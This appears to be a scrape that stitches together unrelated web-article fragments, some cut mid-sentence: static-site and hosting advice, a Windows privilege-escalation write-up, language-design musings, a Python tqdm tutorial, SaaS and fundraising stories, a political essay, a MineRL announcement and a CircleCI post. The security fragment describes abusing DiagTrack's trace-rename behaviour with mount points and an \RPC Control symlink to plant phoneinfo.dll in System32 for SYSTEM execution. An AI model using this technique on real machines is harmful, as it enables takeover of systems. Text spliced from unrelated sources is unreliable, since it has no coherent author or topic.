<p>I cannot really imagine someone making a personal site in Angular unless they really want to force themselves to learn Angular for a job of some kind but there is an interesting <a href="https://angular.io/">Angular</a> static site generator project called <a href="https://github.com/scullyio/scully">Scully</a> that I have been meaning to try. If anyone reading this has played with Scully, send me your thoughts to <a href="mailto:david@formcake.com">david@formcake.com</a>.</p>
<h5 id="x-cool-kid-framework">X Cool Kid Framework</h5>
<p>You are on your own.</p>

<p>Perhaps you are more concerned with creating a blog and how a framework's authoring experience works than what technology powers the rendering of html. X JS forward frameworks tend to require a lot more configuration than those made specifically for creating a simple site. If this is your situation, you are in luck. There are tons of options and they are all fantastic for this purpose. I will go more in depth on some of these options since they are more tailored for a small perosnal site.</p>
<h5 id="jekyll">Jekyll</h5>
<p><a href="https://jekyllrb.com/">Jekyll</a> is the one of the oldest static site generators that made authoring a top concern with its use of Markdown. Built in 2008 by Tom Preston-Werner, Jekyll was part of the Rails era of web development where developer productivity was considered paramount to everything else. Jekyll is still very popular but is a bit of a non starter for many because it is built in Ruby. Still a great choice for a developer blog but you will have to use RubyGems instead of NPM.</p>
<h5 id="hugo">Hugo</h5>
<p><a href="https://gohugo.io/">Hugo</a> is a more modren framework than Jekyll. It tries to solve more problems out of the box than Jekyll, is more flexible, and considers the speed at which it creates pages to be a top concern. Part of Hugo's popularity comes from the fact that it is written in Go. This contributes to its speed but also contributes to some of the annoying aspects about it. Go is an interesting language but most of us don't have the opportunity to use it in our work. It is therefore best for those who love Go and don't mind using Go's templating libraries. You will also have to give up NPM if you choose Hugo.</p>
<h5 id="eleventy">Eleventy</h5>
<p>One of the newest kids on the block, <a href="https://www.11ty.dev/">Eleventy</a> is somewhere inbetween Hugo and Jekyll. It's focus is on flexibility and speed. It is super modular so it does take a little bit more time to get setup but for those looking for flexiblity, Eleventy has it in spades. It supports 11 templating language and best of all, it is a node library so you can use NPM for your entire project. This may be my personal choice if I were creating a new blog.</p>
<h2 id="other-concerns">Other Concerns</h2>
<h4 id="3-static">3) Static????</h4>
<p>Yes. In 2020 there is no reason to choose a framework that does not support static generation of pages for a small personal website. Every framework listed above supports static generation. If you need to be convinced of the power of static websites, checkout <a href="https://jamstack.org/">jamstack.org</a> which does a good job of going into all the benifits.</p>
<h4 id="4-hosting">4) Hosting</h4>
<p>As long as we have made the decision to use static generation, hosting is quite easy. There are still a lot of options however. Here are some of the top options and some of the thinking for when to use them.</p>
<h5 id="netlify">Netlify</h5>
<p><a href="https://www.netlify.com/">Netlify</a> is the hosting platform behind the <a href="https://jamstack.org/">JAMStack</a> movement. Founded in 2014, Netlify has grown rather quickly and has become the defacto hosting platform for static sites. With Netlify you can host static sites, deploy lambdas, and create git based workflows with extreme ease. I would recommend Netlify above all other options for a personal site.</p>
<h5 id="vercel-previously-zeit">Vercel (Previously Zeit)</h5>
<p><a href="https://vercel.com/">Vercel</a> is a very similar hosting platform as Netlify. Founded in 2015, Vercel boasts a fully featured platform for hosting static sites including git workflows and lambdas. I have used Vercel for years and I can recommend it. Vercel is a solid choice but I would recommend Netlify above Vercel for a fully featured static hosting platform.</p>
<h5 id="github-pages">Github Pages</h5>
<p><a href="https://pages.github.com/">Github pages</a> is quite an old option in the space of static website hosting. Launched in 2008 Github pages originally only supported Jekyll and static files but now supports other frameworks through some configuration. Github pages was once unique in that it automatically was integreted into your github account but this is now a common feature with the likes of Netlify and Vercel. Github pages is underpowered at this point but will always be free. If you want to host something simple and never think about it again, Github pages may be just the right choice.</p>
<h5 id="firebase">Firebase</h5>
<p><a href="https://firebase.google.com/">Firebase</a> is a platform as a service hosting provider that has some seriously robust features and is backed by Google. Firebase is not a static website hosting provider and aims to solve much more complicated issues around creating and hosting a sophisticated web application. The only reason you would want to choose Firebase is if you wanted authentication for some reason. Firebase allows for simple authentication and storage via it's flagship features <a href="https://firebase.google.com/products/auth">Firebase Authentication</a> and Firebase <a href="https://firebase.google.com/products/realtime-database">Realtime Database</a>. Firebase may also be a good option if you want to play with server tech but don't want to go too deep into the subject.</p>
<h5 id="heroku">Heroku</h5>
<p><a href="https://www.heroku.com/">Heroku</a> lit the world of application hosting on fire in 2007 when it made hosting a <a href="https://rubyonrails.org/">Ruby on Rails</a> application as simple as a couple of key strokes using the Heroku CLI. Like Firebase, Heroku aims to solve much more complex problems than a simple static website but is a great system for those who like to tinker with their backend. Heroku is for those who need to solve more complicated problems like storage or authentication, but want to do it with open source software instead of google invented technologies. If you are building a personal site to learn server tech, Heroku is a great option.</p>
<h4 id="5-apis">5) APIs</h4>
<p>Assuming you went with one of the hosting platforms specifically designed for simple static websites, you may be wondering "But what if I need a server for X". You are in luck, there is a great resource created by <a href="https://chriscoyier.net/">Chris Coyer</a>, of <a href="https://css-tricks.com/">CSS Tricks</a> and <a href="https://codepen.io/">Codepen</a> fame, that lists services that are great for static websites without a server, <a href="https://serverless.css-tricks.com/services/major">https://serverless.css-tricks.com/services/major</a>. <a href="http://formcake.com/">Formcake</a> also perfectly solves the problem of how to create a contact form on a static website. Formcake is committed to always having a useful free tier for developers with small projects. Consider checking it out the next time you tackle building your personal site.</p>

The limited control over the files content makes exploitation very hard; perhaps crafting an executable PowerShell script or bat file is plausible, but then there is the problem of getting those executed.</p><p>Instead, I chose to combine my active trace recording with a call to:</p><pre><code>WINRT_IMPL_AUTO(Windows<span>::</span>Foundation<span>::</span>IAsyncAction) SnapCustomTraceAsync(param<span>::</span>hstring <span>const</span><span>&amp;</span> outputDirectory)
</code></pre><p>When supplying an <code>outputDirectory</code> value located inside <code>%WINDIR%\temp\DiagTrack_alternativeTrace</code> (Where the <code>.etl</code> files of my running trace are saved) an interesting behavior emerges.</p><p>The Diagtrack Service will rename <em>all</em> the created <code>.etl</code> files in <code>DiagTrack_alternativeTrace</code> to the directory given as the <code>outputDirectory</code> argument to <code>SnapCustomTraceAsync</code>. This allows destination control to be acquired because rename operations that occur where the source file gets created in a folder that grants non-privileged users write access are exploitable. This is due to the permission inheritance of files and their parent directories. When a file is moved by a rename operation, the DACL does not change. What this means is that if we can make the destination become <code>%WINDIR%\System32</code>, and somehow move the file then we will still have write permission to the file. So, we know we control the <code>outputDirectory</code> argument of <code>SnapCustomTraceAsync</code>, but some limitations exist.</p><p>If the chosen <code>outputDirectory</code> is not a child of <code>%WINDIR%\temp\DiagTrack_alternativeTrace</code>, the rename will not happen. The <code>outputDirectory</code> cannot exist because the Diagtrack Service has to create it. When created, it is created with SYSTEM as its owner; only the READ permission is granted to users.</p><p>This is problematic as we cannot make the directory into a mount point. Even if we had the required permissions, we would be stopped by not being able to empty the directory because Diagtrack has placed the snapshot output etl file inside it. Lucky for us, we can circumvent these obstacles by creating two levels of indirection between the <code>outputDirectory</code> destination and <code>DiagTrack_alternativeTrace</code>.</p><p>By creating the folder <code>DiagTrack_alternativeTrace\extra\indirections</code> and supplying <code>%WINDIR%\temp\DiagTrack_alternativeTrace\extra\indirections\snap</code> as the <code>outputDirectory</code> we allow Diagtrack to create the snap folder with its limited permissions, as we are inside <code>DiagTrack_alternativeTrace</code>. With this, we can rename the <code>extra</code> folder, as it is created by us. The two levels of indirection is necessary to bypass the locking of the directory due to Diagtrack having open files inside the directory. When <code>extra</code> is renamed, we can recreate <code>%WINDIR%\temp\DiagTrack_alternativeTrace\extra\indirections\snap</code> (which is now empty) and we have full permissions to it as we are the owner!</p><p>Now, we can turn <code>DiagTrack_alternativeTrace\extra\indirections\snap</code> into a mount point targeted at <code>%WINDIR%\system32</code> and Diagtrack will move all files matching <code>WPR_initiated_DiagTrack*.etl*</code> into <code>%WINDIR%\system32</code>. The files will still be writeable as they were created in a folder that granted users permission to WRITE. Unfortunately, having full control over a file in System32 is not quite enough for code execution… that is, unless we have a way of executing user controllable filenames - like the DiagnosticHub plugin method popularized by <strong><a href="https://twitter.com/tiraniddo">James Forshaw</a></strong>. There’s a caveat though, DiagnosticHub now requires any DLL it loads to be signed by Microsoft, but we do have some ways to execute a DLL file in system32 under SYSTEM security context - if the filename is something specific. Another snag though is that the filename is not controllable. So, how can we take control?</p><p>If instead of making the mountpoint target System32, we target an Object Directory in the NT namespace and create a symbolic link with the same name as the rename destination file, we gain control over the filename. The target of the symbolic link will become the rename operations destination. For instance, setting it to<code>\??\%WINDIR%\system32\phoneinfo.dll</code> results in write permission to a file the Error Reporting service will load and execute when an error report is submitted out of process. For my mountpoint target I chose <code>\RPC Control</code> as it allows all users to create symbolic links inside.</p><p>Let’s try it!</p><p>When Diagtrack should have done the rename, nothing happened. This is because, before the rename operation is done, the destination folder is opened, but now is an object directory. This means it’s unable to be opened by the file/directory API calls. This can be circumvented by timing the creation of the mount point to be after the opening of the folder, but before the rename. Normally in such situations, I create a file in the destination folder with the same name as the rename destination file. Then …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
								<p>I’ve been thinking about designing my own programming language for a long time. I’ve actually been keeping a lot of notes, and even throwing together some code when I can find time. My plan is to build something that takes inspiration from LISP, JavaScript and Smalltalk. I think there’s a niche to be filled. There are many new programming languages coming out lately, but most of them are statically typed and compiled ahead of time. The <a href="https://en.wikipedia.org/wiki/Dynamic_programming_language">dynamic languages</a> that do come out often don’t perform very well (see CPython, Ruby) or have poorly thought out&nbsp;semantics.</p>
<p>I’ve written a few&nbsp;blog posts pointing and laughing at perceived failures of JavaScript, but the truth is that programming language design is hard.&nbsp;There’s no limit to the complexity of the things you can build with programming code. No matter the design choices you make, no matter the language you design, there are bound&nbsp;to be some inconsistencies and weaknesses somewhere.&nbsp;I think that Smalltalk is a very inspiring programming language, revolutionary in many ways, but it’s also one that has gone extinct. It’s interesting, in my opinion, to ask ourselves why Python thrives but Smalltalk died.</p>
<p>Like LISP, Smalltalk implemented some interesting features which have influenced other languages (such as Java and JavaScript). Some nifty features of Smalltalk are really cool, but still aren’t implemented in any other language. For instance, Smalltalk had the ability to suspend running programs into a saved image, and resume execution later at the saved point. As you can imagine, this is extremely powerful and useful. Forget saving documents or saving games, just save the state of an entire program, no implementation effort required.</p>
<p>I found an interesting talk on YouTube titled “What Killed Smalltalk could Kill Ruby Too”:</p>
<p><span><iframe width="560" height="315" src="https://www.youtube.com/embed/YX3iRjKj7C0?version=3&amp;rel=1&amp;fs=1&amp;autohide=2&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;wmode=transparent" allowfullscreen="true"></iframe></span></p>
<p>Robert Martin makes the case that one of the big weaknesses of Smalltalk is&nbsp;that it was just “too easy to make a mess”. Smalltalk was highly dynamic, and encouraged people to “monkey patch” things and do quick fixes/hacks.&nbsp;He also makes the point that Smalltalk just “didn’t play well with others”. When you think about it, Smalltalk had its own source control, IDE and GUI built into live images, living alongside your program. Smalltalk isn’t just a language, it’s an operating system and a way of life. It’s conflating things that would maybe be best left separate.</p>
<p>It seems to me that in some key areas, the&nbsp;Smalltalk creators placed their own radical ideas above everything else. They chose idealism over pragmatism. Smalltalk was a language created with a grandiose vision. It had some deeply rooted principles which didn’t necessarily work so well in practice, such as the idea that everything had to be an object, that the object metaphor should be applied everywhere, one size fits all.&nbsp;At the end of the day, programmers want to get things done and be productive. If the language design or implementation gets in the way of getting things done, people will leave. Pragmatism is key for a programming language to succeed.</p>
<p>Smalltalk was also designed with the idea that it should be easy to learn and intuitive. This has led its creators to have a heavy focus on graphical user interfaces.&nbsp;I watched an introduction to <a href="https://www.youtube.com/watch?v=Ox5P7QyL774">Self on YouTube</a>&nbsp;(Self is a direct descendent of Smalltalk) and saw the heavy emphasis on interacting with objects through UIs. The user interfaces showcased in this video are, in my opinion, horribly complex and unintuitive. Pretty much all of the interactions done through the UI would have been simpler and easier to understand if they had been done by writing one or two lines of code instead!</p>
<p>When you sit down and think about it for one second, you have to realize that programming doesn’t fundamentally have anything to do with graphical user interfaces. Yes, you can use programming code to create GUIs, but there is no reason that programming should have to involve GUIs and be tied to them. The metaphor of writing code has been extremely successful since the very beginning, and it probably makes more sense to the mathematical mind of a skilled programmer. Not everything has to have a visual metaphor. This is again a case of pushing some idealistic principle too far, in my opinion.</p>
<p>I believe that a lack of pragmatism is something that has killed many languages. Not just Smalltalk, but Scheme too. My first experience with Scheme involved trying and failing to install multiple Scheme distributions because I couldn’t get all the dependencies to work. Then, finally getting a Scheme compiler installed, and struggling to implement simple routines to parse text files, because Scheme doesn’t include&nbsp;the most basic string routines. The Scheme compiler I’d selected bragged that the code it produced was highly optimized, but once I finally managed to write my own string routines, I compiled my program, ran it, and it was dog slow.&nbsp;Parsing a one-megabyte CSV spreadsheet took over a minute. I ended up rewriting the code in Python. Why don’t more people code in Scheme? Because they try to realize their ideas in Scheme, and it just doesn’t quite work out.</p>

      <h3 id="introduction">Introduction</h3>

<p>It is natural that we would like to employ progress bars in our programs to show the progress of tasks. <code>tqdm</code> is one of my favorite progressing bar tools in Python. It could be easily incorporated to Python using <code>trange</code> to replace <code>range</code> or using <code>tqdm.tqdm</code> to wrap iterators, in order to show progress bars for a <code>for</code> loop.</p>



<p>Multiprocessing tasks should also have progress bars to show the progress. However, the incorporation of <code>tqdm</code> and <code>multiprocessing</code> was not well documented in Python. In this blog post, I would like to present several ways of using <code>multiprocessing</code> with <code>tqdm</code>.</p>

<h3 id="python-multiprocessing">Python Multiprocessing</h3>

<p>Let’s first take a look at some of the basic class methods in Python <code>multiprocessing</code> library. The commonly used <code>multiprocessing.Pool</code> methods could be broadly categorized as <code>apply</code> and <code>map</code>. <code>apply</code> is applying some arguments for a function. <code>map</code> is a higher level abstraction for <code>apply</code>, applying each element in an iterable for a same function.</p>



<p>More specifically, the commonly used <code>multiprocessing.Pool</code> methods are:</p>

<ul>
  <li><code>apply_async</code></li>
  <li><code>map</code></li>
  <li><code>map_async</code></li>
  <li><code>imap</code></li>
  <li><code>imap_unordered</code></li>
</ul>

<p><code>apply_async</code> and <code>map_async</code> return “future results” immediately, we would need to collect the results using <code>get</code>. <code>map</code>, although it is running functions in parallel, blocks the return of the results until they are ready. <code>imap</code> is a lazier version of <code>map</code>, but it will return an iterator for the processes. <code>imap_unordered</code> is similar to <code>imap</code>, but the execution and returned result order of <code>imap_unordered</code> does not necessarily follow the order of arguments provided.</p>



<p>Based on the nature of these methods, <code>apply_async</code>, <code>imap</code>, <code>imap_unordered</code> are naturally compatible with <code>tqdm</code> to show progress bars.</p>

<h3 id="python-multiprocessing-tqdm-examples">Python Multiprocessing tqdm Examples</h3>

<h4 id="many-small-processes">Many Small Processes</h4>

<p>Sometimes, the entire task consists of many small processes, each of which does not take too much time to finish. The number of processes is much larger than the number of processes we could assign to the <code>multiprocessing.Pool</code>. We would like to monitor the progress of the entire task using one progressing bar.</p>



<p>The bottom line is not modifying the functions we would like to run using <code>multiprocessing</code> and <code>tqdm</code>. In the following examples, I have implemented the examples of using <code>apply_async</code>, <code>imap</code>, <code>imap_unordered</code> with <code>tqdm</code> for functions that take one single argument or multiple arguments.</p>

<p>During the execution of the multiprocessing program, we could see that the 100 jobs were run in 10 batches whose batch size is 10. Each batch roughly takes 0.5 seconds, and the total execution time is roughly 5 seconds.</p>

<p>Sometimes, the entire task consists of few large processes, each of which takes long time to finish. We would like to monitor each of the progress using multiple progress bars.</p>

        <div>

            

            <p>I wouldn't say I'm an expert, but Belle and I have made a SaaS product with web, Android, and iOS apps, starting from scratch, and over the years built it to the point where it pays us both to work on it full-time. That's my idea of success. I'm not interested in being wealthy, or taking venture capital, or scaling beyond the two of us. </p>
<p>Here are some things I've learned along the way. If you think you might like to do something along the lines of what I've described, perhaps you'll find these opinions useful, although I imagine most are not very novel. Many are related so forgive me for repeating myself. </p>
<p>All of these are based on my own experience and values and may be totally the wrong advice for you.</p>
<p><strong>It's okay to start with the technologies you know.</strong> In fact, I strongly recommend it. If you're good at JavaScript, write your backend in Node. If you make iOS apps, start with an app and use something like Firebase if you need server-side bits. Don't start by learning something new, you'll just make something that's already difficult that much harder. (Learn new stuff later, though. That's fine and keeps it fun.)</p>
<p><strong>Things really will go better if you build something you'll use yourself.</strong> Dogfood it. It'll also help you maintain an interest in building it once the novelty of having users and income wears off.</p>
<p><strong>YAGNI <small>(You Ain't Gonna Need It)</small> is a good aphorism but don't take it to mean you can only build what you need today and no more.</strong> I think it's fine to build things in a generic way you can extend. I feel fortunate that Exist's core is still fundamentally the same today, seven years later, because I tried to design a generic data model and integrations architecture that could account for the things we might add. Don't over-architect it, sure, but don't be short-sighted either.</p>
<p><strong>You don't need to go through an incubator or accelerator.</strong> You don't need external funding. These things are undoubtedly useful in some circumstances but they are marketed as a necessity, and even glamorous, because they make other people money. Don't chase status symbols for their own sake. Why give up equity? Why give your investors the means to make decisions for you? Their interests are not necessarily aligned with yours. I'm not saying never do it, just consider your needs instead of taking it as a given.</p>
<p><strong>You don't need to be a "startup".</strong> Your end goal doesn't have to be "CEO of a big tech company with lots of employees". There are viable alternatives and being an indie-sized business is quite a comfortable way to do things.</p>
<p><strong>Mentors are good for support when things are hard, but remember that the person who best understands what you want to do is you.</strong> If they give you conflicting advice, try to understand their viewpoint, and if you still think you know better, ignore it.</p>
<p><strong>If you can make it fit into your life, bootstrapping works fine.</strong> You might move a lot more slowly because you're only working on your product when you're not at your day job, but this doesn't have to be a huge disadvantage.</p>
<p><strong>More generally, you <em>can</em> do it your own way.</strong> We took a lot of actions contrary to the prevailing view of the time, partly just because I like to be contrary, and it worked out. That might just be a combination of luck and privilege, but it's evidence you can point to if someone says things like "you can't get by without an incubator", or "you can't compete with a venture-backed startup as a bootstrapped company of two people who do no marketing", for example.</p>
<p><strong>Don't underestimate persistence.</strong> I don't have a lot of time for PG these days but I do think there's a lot of truth to his saying, "Startups die of suicide, not homicide." We're still here because we kept going even when we weren't making enough money and it wasn't clear that we ever would. We've outlived many competitors, even some who appeared years later. If you just keep going you may eventually get where you want to be. If we'd "failed fast" because one year in we were making hardly any money, we'd probably both still work for other people. </p>
<p><strong>Be authentic.</strong> Be yourself, a human being with flaws who has likes and dislikes and bad days. Don't act like you're a big faceless entity. It won't make people trust you more. Just be you, and be honest if you fucked up, or if you're never going to add that feature, or if you added it because you personally wanted it and you don't care if anyone else did. Paradoxically, it can be better to be open with your users about making mistakes and breaking things than to appear to never break things.</p>
<p><strong>Be open.</strong> Share whatever you can. Be transparent about what you're working on, what you want to do next, how much you're making, and how you're feeling about it. A lot of the goodwill users have towards us is because we have an open roadmap and we publish user and income stats.</p>
<p><strong>Be empathetic.</strong> Try to relate to your users as one human to another. Make the effort to understand why they are angry, or rude, or just don't care about your thing. You will fail a lot, and they won't always deserve it, but a lot of good will come of it. Acknowledge their point of view. When we first opened our pre-launch waiting list for Exist, we got some pretty rude feedback about trying to vacuum up everyone's data to sell, or that our idea was dumb, or that we shouldn't be trying to charge for something nobody would pay for. In each case I tried to understand why someone would feel that way and honestly address their concerns. In nearly every case I succeeded in turning the interaction into a positive one and many of those people signed up. I don't always have the energy to do that any more, and you get better at knowing when to just let it go, but I still believe it's something to strive for.</p>
<p><strong>Be good at support.</strong> Man, the bar for support is just so low, especially for indie software. You've probably experienced emailing the developer of an app you use about a bug and just never getting a reply, right? Replying to support tickets alone probably puts you in the top 50% straight off the bat. Replying quickly, even better, and then caring about the issue and fixing it, would seriously push you into the top 10%. Unless you get a lot of support, it's not even that hard to do, and it's such a good way to make your users think well of you. Again, you'll probably lose the motivation to be prompt and kind over time, but it's always something to strive for.</p>
<p><strong>Listen to user feedback.</strong> User suggestions are useful, and if you track what's popular you'll definitely identify trends worth pursuing. Still, temper them with your own strong ideas about what you're making. Don't just add stuff because one person made a big fuss about your product being useless without it. Get comfortable telling people you are not adding their thing just because they asked for it. As a related point, the loudest users are usually not indicative of the whole.</p>
<p><strong>Get to know your users.</strong> If you are friendly, they will be friendly to you and care about you and your thing, and maybe you will care about them and their things too and you can be friends. Be generous if you can afford to, and probably even if you can't. </p>
<p><strong>Be open to your role changing.</strong> This is a pretty obvious one but you'll have to wear a lot of hats and it might turn out that someone needs to write lots of docs, or do a lot of regular support, and you thought you were just here to code the backend. Things can change and there'll probably be plenty of tasks where there's just nobody else to handle it.</p>
<p><strong>On the other hand, you probably can get away with not doing stuff you really don't want to do.</strong> For example, we don't really do much explicit marketing now because it was Belle's role and she stopped wanting to do it and switched to iOS development. As a compromise we recorded a podcast together irregularly but because I never enjoyed doing it we stopped that too. Would we be better off with more marketing? Almost certainly. But we can get away with not doing it because we hate it and we're established enough now from having been around for years and having done the work earlier. This probably won't translate to everything, for example you can't just not write docs if you make a developer tool, but perhaps you can find a compromise that's tolerable for you.</p>
<p><strong>If you do think you need marketing but you don't like the regular methods, you can try just boosting your personal profile.</strong> Write blog posts, go to your local meetups (when those are a thing again), share screenshots of what you're working on to social media. If that still feels too much like selling yourself (and I sympathise), you could try just doing regular release notes posts for your product, or highlighting technical stuff you're doing, or even just sharing user stats. It doesn't need to be "here's why this is so great", it's just a chance for your thing to be more visible.</p>
<p><strong>Being visible gives you more chances at being visible</strong>, for example people might want to interview you about your work. I like this approach because you can just answer questions honestly and it counts as marketing. </p>
<p><strong>Don't waste time on collaborations, opportunities to work together, or deals with big companies.</strong> Because that's all you'll get out of it — wasted time. In general, anyone you don't know who wants to "hop on a call" with you will only waste your time. Even if there's, like, <em>so much</em> synergy.</p>
<p><strong>I strongly recommend you charge everyone who uses your product.</strong> Free plans only get you freeloaders.</p>
<p><strong>If you get a chargeback, just accept it — you will never win your dispute.</strong> We initially disputed every chargeback and went to the effort to prove that the user had knowingly paid for and used our product. We never won. Just accept the chargeback and then cancel that user's subscription. If someone is going to take that route rather than contacting support or asking for a refund, it's easier just to let them go as a customer. </p>
<p><strong>Offer refunds gladly.</strong> It means more to the user to get a refund than it's worth to you …</p></div></div></div>

From Brasilia to Warsaw and from Delhi to Washington, authoritarian populists are attacking free speech, stoking the ugliest passions of bigots and racists, and concentrating power in their own hands. To safeguard the great cultural and political progress of the past half century, those of us who believe in the values of a free society need to rise to the fight of a lifetime.</p><p>At the very moment when it would be most important for those who oppose an emboldened far-right to speak with confidence and conviction, these same values are losing their luster among significant parts of the left. Companies and cultural institutions <a href="https://www.theatlantic.com/ideas/archive/2020/06/stop-firing-innocent/613615/">fire innocent people</a> for imaginary offenses; prominent voices alternate between defending cancel culture and denying its existence; and an astonishing number of academics and journalists proudly proclaim that it is time to abandon values like due process and free speech.</p><p>It would be easy, and not altogether wrong, to point the finger of blame for the erosion of democracy at its sworn enemies. But the truth is that part of the reason why these values are vulnerable is that so many of their defenders have themselves fallen short. </p><p>Too often, those of us who are committed to a free society lack convincing answers to pressing political questions, including the persistent disparities of race and class. Too often, those of us who seek to defend democracy against its enemies are deeply enmeshed in an establishment that gives people good reason to rebel against it. And too often, those of us who seek to mount a case for philosophically liberal values do so in an overly apologetic or unimaginative way.</p><p>This is why I have grown convinced that we need to build a new community of thinkers, activists, and citizens that is committed to defending and reinvigorating the values of a free and fair society.

<p>We are holding a competition on sample-efficient reinforcement learning using human priors. Standard methods require 
months to years of game time to attain human performance in complex games such as Go and StarCraft. In our competition,
 participants develop a system to obtain a diamond in Minecraft using only four days of training time.

<p>The MineRL competition offeres a set of Gym environments paired with human demonstrations to provide participants with
the ability to tackle the difficult Minecraft sample efficiently. This year we are introducing a new 
vectorized action and observation space that obscures the agent’s actions to prevent participants from using domain
knowlege to solve the ObtainDiamond task!</p>

<h3> The Task: Obtain Diamond in Minecraft </h3>

<p>Minecraft is a 3D, first-person, open-world game centered around the gathering of resources and creation of structures and items. These structures and items have prerequisite tools and materials required for their creation. As a result, many items require the completion of a series of natural subtasks.</p>

<p>The procedurally generated world is composed of discrete blocks that allow modification. Over the course of gameplay, players change their surroundings by gathering resources and constructing structures.</p>

<p>In this competition, the goal is to obtain a diamond. The agent begins in a random starting location without any items, and receives rewards for obtaining items which are prerequisites for diamond.</p>

I found myself at a hotel with some friends. I was visiting Portland for a conference. Puppet’s first investment round — and mine! — was closing. The money was being deposited.</p>
<p>Have you seen a David Mamet movie, like <em>The Spanish Prisoner</em>? They’re fantastic. But eerie. Disquieting. They build up a story, brick by brick. Then they yank a few bricks away, exposing the whole story as a lie. Only a hollow truth remains, unrelated to your built up belief. It makes you question everything.</p>
<p>I’m waiting for the closing in this hotel, and I order a Macallan 18 to celebrate. This was back when it was only expensive, not egregious. I lift the glass, and I think:</p>
<p>The money is being deposited into my bank.</p>
<p>I <em>think</em> it’s a real bank.</p>
<p>I mean, they had, like, a website. And websites are pretty hard to… <em>wait a minute</em>.</p>
<p>Who introduced me to the bank?</p>
<p>The investors introduced me. They specifically wanted me to work with this bank. They’re the ones giving me the money. They wouldn’t say they’re giving me the money then give it to someone else. That’s a silly kind of fraud. I just have to trust them.</p>
<p>I sit there. Sipping my whiskey.</p>
<p>I <em>think</em> it’s a real bank.</p>
<p>I <em>think</em> I’m getting $2.25 million.</p>
<p>I had never seen a bank account with that many zeroes — and I still may not at that point! I have no idea what to do.</p>
<p>So I sit there. Savoring that delicious, delicious whiskey.</p>
<p>I didn’t mean to raise money. I was just focused on running the company. We had bootstrapped for almost four and a half years. I figured we were going it alone.</p>
<p>I had talked to people in the past about raising money. It was like <a href="https://quoteinvestigator.com/2011/04/18/groucho-resigns/">Groucho Marx’s joke</a> about clubs: I wouldn’t take money from the investors willing to give it to me. “Wow, I would love them as an investor,” you get nothing. Or, “I would happily give you money and ruin your life.” Hmm. Not really the deal I’m looking for.</p>
<p>One day at an event, an investor tracked me down. He said, I’d like to invest in your company.  I said, That doesn’t sound right. A lot of investors say, We should talk. He said: We should talk <em>on Monday</em>. That specificity made all the difference.</p>
<p>He made a very confusing offer: We would like to write a $1.75 million check into a $2 million round. I said, how can you be that bad at math and work in finance. He said, Go find other, rich people that you know to give you the rest of the money. I said, you are, literally, the only rich person I know. He said, I just joined this firm. I am not rich. Then we’re stuck, I said.</p>
<p>I lived in Nashville at the time. There are a bunch of rich people there. But they’re all musicians. They don’t do technology. We most emphatically did not hang out. We weren’t going to fill this round through my network.</p>
<p>Eventually, by connecting me to their network of rich people, I was able to raise $2.25 million. Mostly through luck not skill. I didn’t build a deck. I didn’t run a formal process. I didn’t pitch multiple investors to get competitive term sheets. I pretty much did the exact opposite of <a href="https://www.venionaire.com/fundraising-playbook/">the play book</a>. The investor who filled out the round turned me down at first, but I heard his wife persuaded him. I don’t know if she liked me or was cursing him.</p>
<p>Once all of the investors are in place, you wait.</p>
<p>The things you learn in your first round.</p>
<p>Closing takes about thirty days. Five rounds later, I have no idea why. It takes thirty days, and it costs $30,000. One of the terms in the term sheet you get from your investors states that you pay for closing. “We’re going to give you this money, and then you’re going to give some of it to the lawyers.” Investors cap the fees, and the lawyers <em>coincidentally</em> hit that exact number every time.</p>
<p>I honestly don’t know what the lawyers do at closing. The documents are massively long, but they’re pretty much the same. At a late-stage company, I can understand: There is diligence to do (although not by the lawyers), financial data to look through (done by analysts, not lawyers), customers to talk to (by the investors, not the lawyers). At an early stage, though, there just isn’t much information. I don’t know what they do.</p>
<p>But it takes thirty days. And costs thirty grand. Says so on the term sheet.</p>
<p>So you wait.</p>
<p>But when that waiting stopped, boy howdy did things move.</p>
<p>The money did get deposited. It was a real bank after all.</p>
<p>Within a month I’d moved from Nashville to Portland. Within two months, I had my next three employees. And within six months I had a team of ten.</p>
<p>Raising money set us off like a rocket. Bootstrapping for more than four years provided a fantastic foundation for quick growth.</p>
<p>Looking back, I’m glad we raised money. I only wish we had done it earlier.</p>

Let’s dive in:</p><h3 id="1-use-2nd-gen-convenience-images-for-quick-environment-spin-up">1. Use 2nd gen convenience images for quick environment spin up</h3><p>The “Spin Up Environment” step is responsible for creating the virtual environment in which your job will execute (hence “executor”). Pulling in an executor, in this example an entire Docker image, can be slow. Although you can specify a custom Docker image, CircleCI also provides <a target="_blank" rel="noopener noreferrer" href="https://circleci.com/docs/2.0/circleci-images/#next-generation-convenience-images">pre-made convenience images</a> that we have found to be very convenient.</p><p>CircleCI recently released a second-generation version of these convenience images, which promise faster spin-up times. The <a target="_blank" rel="noopener noreferrer" href="https://github.com/CircleCI-Public/cimg-base/blob/master/Dockerfile.template">cimg-base repository</a> documents everything that is installed in the base Docker Image. Because the convenience images are all built off of the same base image, they can cache very well <a target="_blank" rel="noopener noreferrer" href="https://circleci.com/blog/how-to-build-a-docker-image-on-circleci-2-0/">using Docker Layer Caching</a>.</p><p>In our example, the only change we need to make is to point to one of these new images in our <code>executors</code>. In our case, we can also remove our credentials used to access our private image:</p><div><pre><p><span>1</span><span>executors:</span></p><p><span>2</span><span>   ci-node:</span></p><p><span>3</span><span>     docker:</span></p><p><span>4</span><span></span><span>-     - image: 123456789.dkr.ecr.eu-west-1.amazonaws.com/ci-node:our5ha</span><span></span></p><p><span>5</span><span></span><span>+     - image: cimg/node:14.3</span><span></span></p><p><span>6</span><span> </span></p><p><span>7</span><span> workflows:</span></p><p><span>8</span><span>   main_workflow:</span></p><p><span>9</span><span>     jobs:</span></p><p><span>10</span><span></span><span>+      - jest-unit</span><span></span></p><p><span>11</span><span></span><span>-      - jest-unit:</span><span></span></p><p><span>12</span><span></span><span>-         # Give this job AWS credentials to access our private Docker images</span><span></span></p><p><span>13</span><span></span><span>-         context: dev-ctx</span></p></pre></div><p>The results are pretty dramatic when the cache hits:</p><div><p><img src="https://images.ctfassets.net/zp9m00phuodm/4ramSJxcaUSP3OekcYBkRK/9fac31c12fdcd24b12a2a0a66056c72e/1j-4V-pGdkkTL6bRMc4LkeRZqINrhDWebZzn8j9E.png" alt="CircleCI: with cache hits."></p></div><p>Even when the cache doesn’t hit, there are usually enough layers cached that spinning up the environment now takes less than 15 seconds (down from 30-50 seconds before).</p><p>Even more helpful than this speed, the new convenience images are Debian-based. This allows us to use Unix tools that our developers are familiar with, like the package manager <code>apt</code>, instead of the sometimes-confusing Alpine <code>apk</code> (Alpine does not include common 